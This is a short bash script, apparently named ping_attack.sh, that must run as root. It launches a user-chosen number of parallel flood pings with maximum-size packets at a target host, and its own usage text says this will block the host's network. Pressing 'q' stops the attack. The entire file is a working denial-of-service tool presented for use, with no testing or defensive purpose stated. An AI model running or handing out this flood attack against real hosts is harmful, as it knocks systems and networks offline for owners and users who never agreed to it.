#!/bin/bash

if [[ $UID -ne 0 ]]; then
  echo "This script MUST run as ROOT."
  exit 1
fi

if [[ $# -ne 2 ]]; then
  echo -e "Use this script for flood ping some host, will block its network.
usage: [DEST_HOST] [THREAD_COUNT]
example: ./ping_attack.sh 192.168.1.2 10"
  exit 1
fi

echo "Start attack with $2 thread!"
for I in $(seq 1 $2); do
  ping $1 -fs 65507 >/dev/null &
done

while true; do
  read -n1 -sp "[Press \"q\" to exit]" _INPUT
  if [[ ${_INPUT} == q ]]; then
    break
  fi
done

jobs -p | xargs kill
echo "Stop attack."
